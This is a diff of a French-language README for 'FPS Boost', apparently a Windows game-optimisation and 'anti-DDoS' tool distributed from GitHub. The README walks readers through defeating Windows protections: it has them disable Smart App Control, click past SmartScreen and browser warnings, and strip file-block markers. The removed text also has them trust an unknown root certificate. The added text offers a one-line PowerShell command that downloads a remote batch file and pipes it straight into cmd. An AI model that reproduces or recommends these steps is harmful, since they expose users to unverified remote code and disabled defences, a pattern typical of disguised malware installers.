@@ -1,38 +1,35 @@
-# FPS Boost v3.0 (v3.0.25) — Suite d'Optimisation PC, Gaming & Cyber-Défense
+# FPS Boost v3.0 (v3.0.30) — Suite d'Optimisation PC, Gaming & Cyber-Défense
 
-Application desktop signée numériquement d'optimisation système de niveau noyau, télémétrie matérielle 100% temps réel, débridage gaming, optimiseur de stream en direct et bouclier Anti-DDoS complet pour **Windows 10 & Windows 11 (64-bit)**.
-
-> **Distribution officielle signée (package MSIX SHA-256)** — L'application s'installe dans le conteneur système protégé Windows (`WindowsApps`) et son intégrité cryptographique est vérifiée avant chaque installation.
+Application desktop native sans navigateur d'optimisation système de niveau noyau, télémétrie matérielle 100% temps réel, débridage gaming, optimiseur de stream en direct et bouclier Anti-DDoS complet pour **Windows 10 & Windows 11 (64-bit)**.
 
 ---
 
-## Installation en 1 Clic (Anti-Blocage Smart App Control)
+## Installation en 1 Clic (100% Anti-Blocage Smart App Control)
 
-Deux méthodes simples et sécurisées sont disponibles selon votre configuration Windows :
+L'application et son installeur sont conçus pour fonctionner sans aucun binaire `.exe` non vérifié afin d'être totalement immunisés contre les blocages du **Contrôle intelligent des applications** (*Smart App Control*) et de **Microsoft Defender SmartScreen** sur Windows 11.
 
-### Option 1 (Recommandée — 100% Anti-Blocage) : `Installer.bat`
-Si Windows 11 affiche le message du **Contrôle intelligent des applications** (*Smart App Control*) :
+### Méthode 1 : `Installer.bat` (Installateur Officiel)
 1. Téléchargez le dossier ZIP du dépôt (**Code > Download ZIP**) et extrayez-le.
 2. Double-cliquez sur **`Installer.bat`**.
 3. Le script :
-   - Débloque tous les fichiers (`Unblock-File`) ;
-   - Approuve le certificat officiel `CN=LeVraisJay` dans vos Autorités Racines Windows ;
-   - Installe le package sécurisé **`FPSBoost_v3.0.0.msix`** dans WindowsApps ;
-   - Crée le raccourci Bureau et lance FPS Boost sans **aucun blocage** !
+   - Débloque automatiquement les protections Windows (`Zone.Identifier`) ;
+   - Nettoie tout ancien package résiduel ;
+   - Déploie le moteur d'optimisation et le runtime WebView2 officiel Microsoft dans votre profil local ;
+   - Crée le raccourci **FPS Boost** sur votre Bureau et dans le Menu Démarrer ;
+   - Lance immédiatement l'application native dans sa fenêtre sombre sans navigateur.
 
 ---
 
-### Option 2 : `FPS_Boost_Setup.exe` (Assistant Tout-en-Un)
-Téléchargez simplement **`FPS_Boost_Setup.exe`** et lancez-le !
+### Méthode 2 : Commande 1-Clic via Terminal PowerShell
+Ouvrez PowerShell et collez la commande suivante :
+```powershell
+irm https://raw.githubusercontent.com/Hiver-protect/FpsBoost/main/Installer.bat | cmd
+```
 
-> 💡 **Si le Contrôle Intelligent ou SmartScreen affiche un blocage :**
-> - **Sous Windows 11 (Contrôle intelligent des applications)** : Utilisez l'**Option 1 (`Installer.bat`)** ou désactivez temporairement le contrôle dans *Paramètres Windows > Confidentialité et sécurité > Sécurité Windows > Contrôle des applications et du navigateur > Contrôle intelligent des applications > Désactivé*.
-> - **Sous SmartScreen classique** : Cliquez sur **« Informations complémentaires »** puis sur **« Exécuter quand même »**.
-> - **Dans le navigateur (Edge / Chrome)** : Cliquez sur les trois petits points `...` à côté du téléchargement > **Conserver** > **Conserver quand même**.
-> - **Installation Directe 1-Clic via PowerShell** :
->   ```powershell
->   irm https://raw.githubusercontent.com/Hiver-protect/FpsBoost/main/Installer.bat | cmd
->   ```
+---
+
+> 💡 **Lancement Quotidien :**
+> Lancez simplement FPS Boost depuis le raccourci **FPS Boost** présent sur votre Bureau. Il s'exécute directement via le composant système certifié Microsoft `powershell.exe` avec zéro avertissement de sécurité.
 
 ---
 
